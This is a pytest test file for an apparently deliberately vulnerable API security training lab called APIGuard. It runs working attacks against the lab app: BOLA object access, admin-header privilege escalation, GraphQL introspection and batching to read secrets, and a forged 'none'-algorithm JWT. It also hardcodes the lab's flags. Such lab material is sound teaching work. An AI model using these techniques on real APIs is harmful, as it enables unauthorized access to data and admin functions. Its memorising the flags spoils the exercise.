#!/usr/bin/env python3
"""Tests for Lab 22: API Security & Modern Auth Lab (APIGuard)."""

import base64
import importlib.util
import json
import os
import sys
import pytest
from starlette.testclient import TestClient

_app_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "app", "main.py"))
_spec = importlib.util.spec_from_file_location("api_security_lab_main", _app_path)
_mod = importlib.util.module_from_spec(_spec)
sys.modules["api_security_lab_main"] = _mod
_spec.loader.exec_module(_mod)

app = _mod.app


@pytest.fixture
def client():
    return TestClient(app)


def test_status_endpoint(client):
    res = client.get("/api/status")
    assert res.status_code == 200
    data = res.json()
    assert data["status"] == "ready"
    assert "APIGuard" in data["lab"]
    assert len(data["missions"]) == 3
    assert data["port"] == 8022


def test_dashboard_served(client):
    res = client.get("/")
    assert res.status_code == 200
    assert "text/html" in res.headers["content-type"]
    assert "APIGuard" in res.text
    assert "Mission 1: BOLA" in res.text


def test_mission1_login_and_bola(client):
    # 1. Login with alice
    login_res = client.post("/api/v1/auth/login", json={"username": "alice", "password": "password123"})
    assert login_res.status_code == 200
    assert "token" in login_res.json()

    # 2. Access own order
    own_res = client.get("/api/v1/orders/order_1001")
    assert own_res.status_code == 200
    assert own_res.json()["owner"] == "alice"

    # 3. Access VIP order without ownership check (BOLA)
    vip_res = client.get("/api/v1/orders/order_9999")
    assert vip_res.status_code == 200
    d = vip_res.json()
    assert d["owner"] == "ciso_admin"
    assert d["confidential"] is True
    assert "BOLA successful" in d["hint"]


def test_mission1_bfla_privilege_escalation(client):
    # 1. Missing admin header -> 403
    unauth_res = client.get("/api/v1/admin/export_users")
    assert unauth_res.status_code == 403

    # 2. Inject X-Admin-Role header -> 200 & flag
    auth_res = client.get("/api/v1/admin/export_users", headers={"X-Admin-Role": "internal_sec"})
    assert auth_res.status_code == 200
    d = auth_res.json()
    assert d["status"] == "success"
    assert len(d["users"]) == 3
    assert "FLAG{bola_idor_bfla_api_privilege_escalated_4822}" in d["flag"]


def test_mission2_graphql_introspection(client):
    # 1. Introspection query to discover types
    intro_query = {"query": "{ __schema { types { name fields { name } } } }"}
    res = client.post("/graphql", json=intro_query)
    assert res.status_code == 200
    data = res.json()
    assert "data" in data
    types = data["data"]["__schema"]["types"]
    query_type = next((t for t in types if t["name"] == "Query"), None)
    assert query_type is not None
    field_names = [f["name"] for f in query_type["fields"]]
    assert "systemSecrets" in field_names


def test_mission2_graphql_secret_query_and_batch(client):
    # 1. Direct query of systemSecrets
    query = {"query": "query { systemSecrets { masterApiKey flag } }"}
    res = client.post("/graphql", json=query)
    assert res.status_code == 200
    data = res.json()["data"]["systemSecrets"]
    assert "SEC_GRAPHQL_VIBE_KEY" in data["masterApiKey"]
    assert "FLAG{graphql_introspection_batching_bypass_7193}" in data["flag"]

    # 2. Batch query support
    batch_req = [
        {"query": "query { publicNotice }"},
        {"query": "query { systemSecrets { masterApiKey flag } }"},
    ]
    batch_res = client.post("/graphql", json=batch_req)
    assert batch_res.status_code == 200
    b_data = batch_res.json()
    assert isinstance(b_data, list)
    assert len(b_data) == 2
    assert "publicNotice" in b_data[0]["data"]
    assert "FLAG{graphql_introspection_batching_bypass_7193}" in b_data[1]["data"]["systemSecrets"]["flag"]


def test_mission3_jwt_tampering_none_alg(client):
    # 1. Fetch sample token
    sample_res = client.get("/api/v1/auth/sample_token")
    assert sample_res.status_code == 200
    token = sample_res.json()["sample_jwt"]

    # Verify regular user token fails escalation
    verify_res = client.post("/api/v1/auth/jwt_verify", headers={"Authorization": f"Bearer {token}"})
    assert verify_res.status_code == 200
    assert verify_res.json()["admin_access"] is False

    # 2. Forge 'none' algorithm JWT with role: admin
    h_b64 = base64.urlsafe_b64encode(json.dumps({"typ": "JWT", "alg": "none"}).encode()).decode().rstrip("=")
    p_b64 = base64.urlsafe_b64encode(json.dumps({"sub": "attacker", "role": "admin"}).encode()).decode().rstrip("=")
    forged_token = f"{h_b64}.{p_b64}."

    pwn_res = client.post("/api/v1/auth/jwt_verify", headers={"Authorization": f"Bearer {forged_token}"})
    assert pwn_res.status_code == 200
    d = pwn_res.json()
    assert d["status"] == "authenticated"
    assert d["admin_access"] is True
    assert "FLAG{jwt_alg_none_jwks_confusion_pwned_8842}" in d["flag"]
